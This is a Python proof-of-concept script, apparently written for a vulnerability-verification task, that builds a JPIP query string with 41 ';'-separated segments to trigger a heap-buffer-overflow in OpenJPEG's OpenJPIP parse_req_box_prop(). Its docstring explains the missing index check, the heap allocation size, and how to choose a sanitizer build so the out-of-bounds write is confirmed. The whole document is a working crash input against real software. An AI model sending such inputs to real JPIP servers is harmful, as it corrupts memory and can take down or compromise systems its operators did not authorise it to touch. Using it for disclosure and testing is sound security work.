#!/usr/bin/env python3
"""
PoC generator for: heap-buffer-overflow in OpenJPEG OpenJPIP
parse_req_box_prop() (src/lib/openjpip/query_parser.c)

The JPIP "metareq" query field can contain an arbitrary number of
';'-separated req-box-prop segments inside "[...]". Each segment
increments a local `numofboxreq` counter that is passed as `idx` into
parse_req_box_prop(), which writes query_param->box_type[idx],
limit[idx], w[idx], s[idx], g[idx], a[idx], priority[idx] -- all fixed
MAX_NUMOFBOX(10)-element arrays inside the single heap allocation
returned by get_initquery() (opj_malloc(sizeof(query_param_t))) --
with NO check that idx < MAX_NUMOFBOX.

41 single-character segments ("*") push idx from 0 to 40, which is far
enough to write past the end of the 384-byte query_param_t heap
allocation (empirically: idx just above ~34 already exceeds it), while
the whole metareq value stays under fieldval's 128-byte capacity so
get_fieldparam()'s own (separate, already-documented) bug does not fire
first and mask this one.

NOTE: with the project's default combined -fsanitize=address,undefined
build, UndefinedBehaviorSanitizer's compile-time array-bounds check on
`box_type[10][4]` fires first at idx==10 (a *logical* bounds violation
that is still inside the same malloc'd chunk, not memory corruption --
excluded from scope per the verification brief). This PoC's segment
count (41) is chosen so that, when tested against an ASan-only build
(no -fsanitize=undefined) exactly as the project would also produce
with BUILD_JPIP=ON, the write is proven to actually leave the heap
allocation (genuine AddressSanitizer heap-buffer-overflow), not merely
the UBSan logical check. See build.txt for both build configurations.

Output: query_string.txt - QUERY_STRING value with 41 minimal
req-box-prop segments.
"""

NUM_SEGMENTS = 41   # idx 0..40, comfortably past MAX_NUMOFBOX(10) and past
                     # the end of the 384-byte query_param_t heap allocation
segments = ";".join(["*"] * NUM_SEGMENTS)
QUERY_STRING = f"metareq=[{segments}]"

if __name__ == "__main__":
    with open("query_string.txt", "w") as f:
        f.write(QUERY_STRING)
    print(f"wrote query_string.txt: {len(QUERY_STRING)} bytes, {NUM_SEGMENTS} segments")
